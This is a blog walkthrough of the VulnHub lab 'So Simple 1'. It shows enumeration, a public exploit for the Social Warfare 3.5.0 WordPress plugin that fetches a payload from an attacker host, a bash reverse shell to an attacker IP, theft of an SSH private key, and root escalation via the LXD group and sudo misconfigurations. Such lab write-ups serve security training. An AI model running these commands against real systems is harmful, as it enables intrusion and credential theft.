---
title: VulnHub - So Simple 1
layout: post
date: 2020-08-12 15:00:00 +0800
---

![92fcd502bc744111ad87e3b395653453.png](/images/vh-sosimple1/f1c60c3706fc4468b55e65a1aa1be478.png)

### 0. Preface

If you are still using Social Warfare 3.5.0 on WordPress, please update that plugin. Also, don't leave users hanging around in the LXD group. Both of those are bad for health. 

In this box, we will be tackling: 

1. RCE through Social Warfare 3.5.0 
2. Two different methods of privilege escalation
	- Using LXD (unintended)
	- Using GTFOBins and some scripts and binaries

<!--excerpt-->

---

### 1. Preliminary NMAP Scan

```bash
sudo nmap -sC -sV -oN nmap.txt 192.168.32.8 -v
```

![09b4765532b001ce007b7e67e09c997c.png](/images/vh-sosimple1/9063499aec4e424b87fce9a2429adad7.png)

This box is running on Ubuntu, and it also has a HTTP server on Port 80. 

### 2. HTTP Enumeration

![d358e68d14bc84581274daa6c20043df.png](/images/vh-sosimple1/238f87cf7f454a9cb7fbac775c34e623.png)

Nothing but an image? Let's run gobuster on this. 

```
gobuster dir -u http://192.168.32.8 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt
```

![5f286b3bfd2193480a6ab30890debb99.png](/images/vh-sosimple1/bf16e8e30c5f427090da0036828aed33.png)

Let's visit `/wordpress`.

![fa31e5cce52aeab69b55a8aaac684119.png](/images/vh-sosimple1/5137f03d570041028810ee1778a5ecff.png)

We got our first potential username - `admin`. 

![3487ffdde6d1831db52cb539aa6e66de.png](/images/vh-sosimple1/5b8433a265e647c480c80cedf6ddeceb.png)

Looking at the page source, we find that this is running WordPress 5.4.2 which is a pretty recent version. Googling gives us nothing to exploit. 

### 3. Wordpress Plugin Exploit

Further looking at the page source, we see that this is running Social Warfare 3.5.0. 

![6daaa323e70ebd0c6368207d51c91aeb.png](/images/vh-sosimple1/5746edc52b904c61a8b8eff47174f4b2.png)

This version of the plugin [is exploitable](https://threatpost.com/exploits-social-warfare-wordpress/144051/), and we actually have [a POC](https://github.com/hash3liZer/CVE-2019-9978).

Let's test it out.

```bash
python cve-2019-9978.py --target "http://192.168.32.8/wordpress/" --payload-uri "http://192.168.32.4:8000/payload.txt"
```

![ef80e23619226cc332a9a39399aca250.png](/images/vh-sosimple1/3ef2158861924bc4ae5de5b7a8d816b7.png)

![287c778ad547f18632e5799f0e3cc54a.png](/images/vh-sosimple1/c0ff6b2ee5494c42944f8c9a585b2c3b.png)

Awesome. It works. This allows us to do Remote Code Execution. Looking at the `/etc/passwd` file from the server we see two potential usernames - `max` and `steven`. 

Next, let's try to enumerate the box as much as we can. 

```php 
<pre>system('whoami; hostname; id')</pre>
```

![da78ea4cd7208d270cb6fbc713286a59.png](/images/vh-sosimple1/ebacb99247e043b585810ccfeafe3d48.png)

We see that this web server is running as www-data. Nice. Let's get a reverse shell going.

```php
<pre>system("bash -c 'bash -i >& /dev/tcp/192.168.32.4/4545 0>&1'")</pre>
```

![fb573ca369fb0a4505cddb276b3896a1.png](/images/vh-sosimple1/5ea83e3cc8784fd7aa2960f201b4865f.png)

And we're in. 

### 4. Logging in as Max

Upon doing further enumeration, we find `max`'s id_rsa key inside the `/home/max/.ssh` directory. We can use this to SSH into the box as `max`. Let's download it.

![cc8150fe41099850562c5cbeee9fb26e.png](/images/vh-sosimple1/56b22036602e4260a8742ab98e0486bd.png)

### 5. Privilege Escalation Using LXD (Unintended)

**Have checked with the box creator, [@roelvb79](https://twitter.com/roelvb79), this is an unintended way to get to root, which skips us past user #2.**

After logging in, let's first grab the `user.txt` from `/home/max`.

![cee3fcefc000ea483351c46c666f016f.png](/images/vh-sosimple1/02af01dd44a140ed94ea8a88957d4d8d.png)

We notice in the `id` command for `max` that it is in the `lxd` group, which [is exploitable](https://github.com/initstring/lxd_root)

Let's first download one of the smallest Linux distributions around - [Alpine Linux](https://www.alpinelinux.org). 

Next, following [this guide](https://ubuntu.com/tutorials/create-custom-lxd-images#4-creating-a-metadata-file), we create a metadata.yaml file and compress it into a tarball using `tar -cvzf metadata.tar.gz metadata.yaml`. 

Now, upload both the Alpine image, metadata tar archive and the exploit to the remote server. As the LXD on this box has not been initialised, we can do so using `lxd init` and leave all settings default. 

Now we need to import both the metadata and the image and spin up the container.

```bash
lxc image import metadata.tar.gz alpine.tar.gz --alias alpine
lxc launch alpine
```

For this exploit to work, we need the container name.

```bash
lxc list
```

![446df0e243bf15fe775d2e79290c6681.png](/images/vh-sosimple1/3959cc002eb6490ba10bae8fe286cff7.png)

Now that we have gotten everything ready, we can run the exploit using the newly created container. 

```bash
./lxd_rootv1.sh enabling-weasel
```

![5dd4593a750d03d9702d9659139a68db.png](/images/vh-sosimple1/84259b51f3004ffba3a08e735e3d39c5.png)

After this, we can simply use `sudo -i` to elevate ourselves to root without requiring a password. 

We can grab flag.txt for final flag, as well as the `user2.txt` we missed from `/home/steven`. 

![1c94af5da529375bc91f778bc495251e.png](/images/vh-sosimple1/a359e9e6220f40fe9fb3cf3f2db09441.png)

### 5. Privilege Escalation (Intended)

**If you want to do this box properly, this is the intended way to do so.**

Looking at `sudo -l` for `max`, we see that it is able to run `/usr/sbin/service` as `steven` without the need for a password. 

![f472e095c24fecbd004c4bf569c8fb11.png](/images/vh-sosimple1/650642fc3b8043908cb7ef8618ea6754.png)

Let's see what we can find using GTFOBins. 

![3ee10911f42663e5cb4cc85fff0750fd.png](/images/vh-sosimple1/80987a7702b74090a9ce55d062f06be3.png)

Nice, we can spawn a shell with the `service` binary as `steven`. 

```bash
sudo -u steven service ../../bin/bash
```

![cd376d6f4e6459fa80f93207e847f95a.png](/images/vh-sosimple1/b49a5513a440475988c5da5b983345d8.png)

Let's first grab `user2.txt` from `/home/steven`. 

![0b65dee28885f44f1d43b4ee393c311c.png](/images/vh-sosimple1/f5ecea0caa3e4c9dbd7062b8284cae19.png)

Again, looking at `sudo -l` for `steven`, we see that it's able to run `/opt/tools/server-health.sh` as root without a password. But the script doesn't exist.

![88fd170be9dcf7e77ba1733444cb8665.png](/images/vh-sosimple1/22c8de25eb1d4cb7bf4cd3477981253a.png)

Let's create it ourselves.

![3870640c3afba93e7cac19c48a24720e.png](/images/vh-sosimple1/d8a4df1b926d4f398edba3aed0472c9b.png)

Now we can run the script to get a root shell. 

![9cc3e2c502359f33704fdc6ca6ac720c.png](/images/vh-sosimple1/cabf39605e784cd2a7423d71b57d3ebe.png)